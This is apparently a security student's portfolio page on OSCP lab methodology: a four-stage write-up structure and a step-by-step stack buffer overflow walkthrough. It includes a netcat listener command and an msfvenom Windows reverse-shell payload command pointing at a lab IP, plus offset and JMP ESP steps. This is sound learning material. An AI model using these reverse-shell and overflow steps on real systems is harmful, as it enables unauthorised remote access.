---
title: "Procedural Skills"
date: 2020-12-30T10:18:24+02:00
draft: false
summary: "Proof for the use of procedural best-practices and reporting products of a security specialist"
---


### Reporting procedure 

For the reports that were made in the write-up part of the portfolio, a well-structured method was used. To be more exact each write-up is structured in 4 parts :

-Enumeration

-Exploitation

-Foothold

-Privilege escalation


The structure was partially inspired from the hack the box [machine write-ups](https://github.com/Hackplayers/hackthebox-writeups) used to report on boxes. By going through multiple write-ups and analyzing  the way that professional hackers structure their work and combining it with the reporting structure that was used for [OSCP](https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf). Namely: 

-Information Gathering

-Service Enumeration

-Penetration

-House Cleaning


I was able to come up with a methodology of approaching machines that could be more or less replicable for all tests and that could produce reports that follow the same points. Because I used a methodology inspired by the common [penetration path](https://fhict.instructure.com/courses/6836/files/676274/preview) I was able to consistently and reliably penetrate machines.

The method that I used is explained in the diagram below:



------------------------
![pingAllMachines](/Procedural//diagramMachineMethodology.png)
#### [Figure 1.0 - Attack procedure] 

##### Enumeration

Some reporting/ attacking systems suggest starting with passive information gathering, reconnaissance. While this is a very useful step in a real-life penetration test in the lab environment from OSCP all machines are just IPs that need to be accessed. The fastest and most reliable way to start a test was through a general scan to understand the available attack routes.

Usually, the Nmap TCP scan is quite fast, especially if directed at the most common ports, afterward depending on the found ports 80, 8080, 443. You decide what further enumeration is needed. Enumerating the vulnerable pages with dirtbuster and scanning for possible exploit paths with Nessus usually gives enough information for deciding on the attack plans.

##### Possible footholds

That being said before deciding on an attack the enumeration results must be analyzed. Based on the found ports you can deduct different applications that might be exploited, some of the possible red flags or routes that are worth exploring are stated in the diagram.


##### What to find
After the application is identified the next step is to look for an initial compromise. This are vulnerable vectors that have a possibility of being compromised or easily compromisable.

##### Tools to use to run exploits
Once a few possibly exploitable elements have been identified the attacker can start establishing a foothold. This usually means getting shell access to the machine.  

In order to achieve this there are a number of tools that can be used like searchsploit, metasploit sqlmap etc. . After running the exploit through this tools one can gain a foothold. 

##### Gain shell on machine
In boxes and OSCP machines a foothold is usually a way in the machine, shell access. This can be gained through ssh, rdp or reverse sehll. One command that is essential for this step is -nc -lnvp 444. A command that starts a listener on the machine that you are trying to gain a shellcode. 


##### Internal exploration for privilege escalation


Once inside the machine one can say that they have control over that machine. However, this is not entirely correct. To reach the highest level of control the attacker needs to gain root or system32 user access. Sometimes it is as easy as running the sudo su command but most times you need to find something that is misconfigured. The questions that are listed in the diagram are the questions that one can answer to find an exploitable privilege escalation route.

##### Privilege escalation

Finally depending on what kind of vulnerability was found different methods can be used to reach the highest level of control over the target machine. Most of the time it is a specific kind of attack but using the previous questions and the most common attack patterns in combination with metasploit and seachsploit  or a specific CVE one can obtain root or system32 on a machine. 


Tips: never work on any of the steps for more than 1h 30 min if that is the case it might be that you need to look in an external place for the information that you need to continue, looking at other machines in the same network sometimes reveals information needed to crack the current machine.


### Buffer overflow

Debatingly one of the most important privilege escalations in the OSCP course is the Buffer Overflow. 
This exploit focuses on finding an application that is vulnerable to buffer overflow. A buffer overflow occurs when the buffer receives more characters than it can hold and it spills on another
memory registry. The trick to finding it is to look for C or C++ written programs that may have a x32 architecture for a x64 base operating system or by analyzing the base code. To exploit a buffer overflow you need access to both the machine and the base code so you can analyze it with a debugger. 

Once found a buffer overflow exploitation usually follows the steps described in the following diagram:

![pingAllMachines](/Procedural//BufferOverflowSteps.png)
#### [Figure 2.0 - Buffer Overflow Steps]


##### Build Fuzzer

The first part of the process is identifying the number of characters that can overflow the application. On a lot of occasions, people like to use the character "A" which has an ASCII representation of 41. This is important to know because once you send the payload to the machine that has the vulnerable application you are analyzing with the help of a debugger or whatever tool you are using to see when is the EIP represents the next instruction pointer. This is important because once we have a payload that is big enough to overflow over the EIP the contents of EIP will be completely filled with 41414141 and this will be an indication that the payload is bigger than the buffer.

##### Crash application with overflow buffer

Once a big enough payload is created the application will crash. This will further confirm that the target application is vulnerable to buffer overflow. At this point, you have determined that a certain value is high enough but you still need to know what is the exact minimum value that you can send to overflow the buffer of EIP.

##### Make custom payload

To this end a custom payload is made. An example of how to that is the code bellow:

```javascript
msf-pattern_create -l 800
```

This helps with better analyzing the payload inside the debugger because all characters are different it is easy to see where the offset is and what the bad characters are.

##### Identify offset
The offset is the exact number of characters that are needed to fill the memory until we reach EIP, afterwards, the next bite will be filling the EIP.  Determining this lets us drop off the payload at the right memory address. To determine the offset we can either look at the custom payload in memory or we can use the same tool to determine it for us based on the EIP value. 

```javascript
msf-pattern_offset -l 800 -q 42306142
```

##### Determine bad characters

Next one of the things that happens when a program is made is that some characters have a certain meaning in the context of the vulnerable target application. To be able to determine these characters you need to analyze the memory dump and see where the characters stop being in the order that they are sent with the custom payload. This is a tedious process but necessary to ensure that the payload does not contain any characters that may threaten the validity of the instructions. Once all the bad characters are determined the next step is to determine the JMP to ESP registry address.

##### Locate JMP ESP

To locate the JMP ESP we can either use the tool that we have been using until now.

```javascript
msf-nasm_shell
nasm > jmp esp
00000000 FFE4 jmp esp 
```

What this gives us the memory address of the jmp esp, there are other ways to find it depending on the debugger but the important part is that we get the hex value of the jmp esp and remember to add it to our payload but reversed in this case that would be.

`10090c83`
##### Create working payload
Once the offset is determined, the bad characters are noted on the side and the jmp to head of stack address is identified we can create a payload 

```javascript 

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.121 LPORT=443 -f python -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

##### Add NOP sled for spacing
One last step before ensuring that the whole exploit is complete you need to add a few NOP sleds. A NOP is a no-operation instruction and it is "sled" before the payload to ensure that the program branches to another memory address anywhere on the slide in this case the instructions send with the payload.

##### Insert Payload

Finally the most exciting part of the hole process is sending the completed payload to the target and seeing your exploit run the way that it is supposed to or determining why it isn't.